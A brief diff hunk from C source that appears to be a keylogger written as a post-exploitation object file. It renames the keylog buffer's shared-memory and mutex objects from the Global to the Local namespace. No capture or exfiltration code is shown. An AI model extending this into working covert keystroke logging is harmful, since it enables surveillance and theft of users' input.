@@ -13,8 +13,8 @@ DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReleaseMutex(HANDLE);
 DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
 
 #define KEYLOG_MAGIC      0xDEADBEEF
-#define KEYLOG_MAP_NAME   "Global\\keylog_buf"
-#define KEYLOG_MUTEX_NAME "Global\\keylog_mutex"
+#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
+#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"
 
 #pragma pack(push, 1)
 typedef struct {
